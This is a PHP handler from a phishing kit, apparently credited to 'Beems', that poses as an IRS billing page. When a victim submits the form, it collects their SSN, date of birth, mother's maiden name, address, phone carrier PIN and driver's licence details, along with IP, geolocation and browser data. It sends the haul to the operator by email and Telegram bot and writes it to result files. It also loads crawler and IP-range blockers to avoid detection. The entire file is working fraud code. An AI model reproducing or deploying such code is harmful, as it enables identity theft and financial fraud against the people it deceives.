<?php
session_start();
/*
* Scampage by Beems
* Jabber: beems@exploit.im
* ICQ: Beems
*/
require_once '../../main.php';

require_once '../../blocker.php';
if($block_referrer == "on") {
    require_once '../../crawlerdetect.php';
}
if($block_iprange == "on") {
    require_once '../../blacklist.php';
}
require_once '../session.php';

if (!$_POST['SecurityNumber']){
} else {
    $VictimInfo1 = "| Submitted by : " . $ip . " (" . gethostbyaddr($ip) . ")";
    $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| UserAgent : " . $user_agent . "";
    $VictimInfo4 = "| Browser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $LicenseNumber = $_SESSION['LicenseNumber'] = $_POST['LicenseNumber'];
    $LicenseNExp = $_SESSION['LicenseNExp'] = $_POST['LicenseNExp'];
    $LicenseNumberWeight = $_SESSION['LicenseNumberWeight'] = $_POST['LicenseNumberWeight'];
    $LicenseNumberHeight = $_SESSION['LicenseNumberHeight'] = $_POST['LicenseNumberHeight'];
    $LicenseIss = $_SESSION['LicenseIss'] = $_POST['LicenseIss'];
    $MaidenName = $_SESSION['MaidenName'] = $_POST['MaidenName'];
    $fullname = $_SESSION['fullname'] = $_POST['firstName']." ".$_POST['middleInitial']." ".$_POST['lastName'];
    $DateOfBirth = $_SESSION['DateOfBirth'] = $_POST['DateOfBirth'];
    $StreetAddress = $_SESSION['StreetAddress'] = $_POST['StreetAddress'];
    $StateRegion = $_SESSION['StateRegion'] = $_POST['StateRegion'];
    $ZipCode = $_SESSION['ZipCode'] = $_POST['ZipCode'];
    $CityR = $_SESSION['CityR'] = $_POST['CityR'];
    $NumberPhone = $_SESSION['NumberPhone'] = $_POST['NumberPhone'];
    $NumberCarrier = $_SESSION['NumberCarrier'] = $_POST['NumberCarrier'];
    $NumberPin = $_SESSION['NumberPin'] = $_POST['NumberPin'];
    $SecurityNumber = $_SESSION['SecurityNumber'] = $_POST['SecurityNumber'];
    $message = "+ -------- [ ⚡ Beems IRS ⚡ ] -----------+\n";
    $message .= "+ 💎 Personal Information\n";
    $message .= "| Full name : $fullname\n";
    $message .= "| Date of birth : $DateOfBirth\n";
    $message .= "| SSN : $SecurityNumber\n";
    $message .= "| MMN : $MaidenName\n";
    $message .= "| Address : $StreetAddress\n";
    $message .= "| State : $StateRegion\n";
    $message .= "| City : $CityR\n";
    $message .= "| Zip : $ZipCode\n";
    $message .= "| Telephone : $NumberPhone\n";
    if ($enablephonepin === "on") {
        $message .= "| Phone Carrier : $NumberCarrier\n";
        $message .= "| Phone Carrier Pin : $NumberPin\n";
    }
    $message .= "| License Number : $LicenseNumber\n";
    $message .= "| License Weight: $LicenseNumberWeight\n";
    $message .= "| License Height: $LicenseNumberHeight\n";
    $message .= "| License Issued State: $LicenseIss\n";
    $message .= "| License Expiry: $LicenseNExp\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 🌐 Victim Information\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ------------------------------------+\n";

    $subject = "IRS BILLING: ".$fullname." : [ $cn - $os - $ip ]";
    kirim_mail($email_result, "IRS BILLING: ".$fullname, $subject, $message);
    kirim_tele($telegram_bot_token, $telegram_chat_id);
    tulis_file("../../result/total_billing.txt", $ip);
    $dob_year = explode("/",$DateOfBirth);
    $dob_year = (end($dob_year));
    tulis_file("../../data/rezs/".$ip."_".$StateRegion."_".$dob_year.".txt", $message);
    if($save_file == "on") {
        tulis_file("../../data/Data_Billing_bank.txt", $message);
    }
}
?>